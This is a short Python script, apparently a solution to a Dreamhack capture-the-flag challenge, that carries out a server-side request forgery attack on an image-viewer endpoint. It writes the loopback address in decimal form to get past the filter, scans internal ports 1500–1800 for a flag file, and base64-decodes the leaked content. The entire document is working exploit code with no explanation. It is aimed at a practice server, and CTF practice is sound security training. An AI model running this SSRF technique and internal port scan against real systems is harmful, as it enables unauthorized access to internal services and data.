import requests
import base64

url = "http://host3.dreamhack.games:10480/img_viewer"

for p in range (1500, 1801):
  data = {'url': f'http://2130706433:{p}/flag.txt'}
  response = requests.post(url, data = data)
  if "REh7" in response.text:
    html = response.text
    base64_img_data = html.split('base64,')[1].split('"')[0]           
            # Base64 문자열을 다시 원래 텍스트로 디코딩
    flag = base64.b64decode(base64_img_data).decode('utf-8')           
    print(f"🚩 찐 최종 FLAG: {flag}")
    break
